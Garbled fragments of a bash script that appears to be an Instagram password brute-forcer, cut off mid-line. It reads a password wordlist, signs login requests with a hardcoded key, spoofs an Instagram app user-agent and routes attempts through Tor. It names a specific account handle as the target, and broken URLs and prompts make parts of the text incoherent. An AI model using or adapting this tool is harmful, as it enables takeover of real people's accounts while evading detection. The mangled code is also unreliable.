...
var=$(curl -i -s -H "$header" https://https://www.instagram.com/marian.arias77964/)
...
#checkroot
dependencies
read -p $'\e[marian.arias77964 account:340282366841710300949128117892872813010 \e[0m' user
checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "https://www.instagram.com/marian.arias77964/ ")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;}marian.arias77964\e[0m\n"
sleep 1
start
else
...
ig_sig="340282366841710300949128117892872813010"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 apple (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram apple
